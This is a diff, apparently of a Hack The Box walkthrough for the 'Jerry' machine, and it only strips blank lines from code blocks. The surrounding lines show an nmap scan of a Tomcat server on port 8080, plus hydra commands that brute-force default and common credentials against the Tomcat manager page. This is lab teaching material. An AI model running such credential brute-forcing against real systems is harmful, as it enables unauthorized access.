@@ -30,7 +30,6 @@ Although Jerry is one of the easier machines on Hack The Box, it is realistic as
 ## Nmap
 
 ```bash
-
 # Nmap 7.94 scan initiated Tue Sep 26 19:01:11 2023 as: nmap -sVC -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 8080 jerry.htb
 Nmap scan report for jerry.htb (10.129.136.9)
 Host is up, received user-set (0.062s latency).
@@ -47,7 +46,6 @@ PORT     STATE SERVICE REASON          VERSION
 
 Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-
 # Nmap done at Tue Sep 26 19:01:23 2023 -- 1 IP address (1 host up) scanned in 12.35 seconds
 ```
 
@@ -316,10 +314,8 @@ root.txt
 In other cases, the credentials might be changed
 
 ```bash
-
 # Default Creds for tomcat
 hydra -C /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt jerry.htb -s 8080 http-get /manager/html -I -vV -t 50
-
 
 # Common Default Creds
 hydra -L /usr/share/seclists/Usernames/cirt-default-usernames.txt -P /usr/share/seclists/Passwords/cirt-default-passwords.txt jerry.htb -s 8080 http-get /manager/html -I
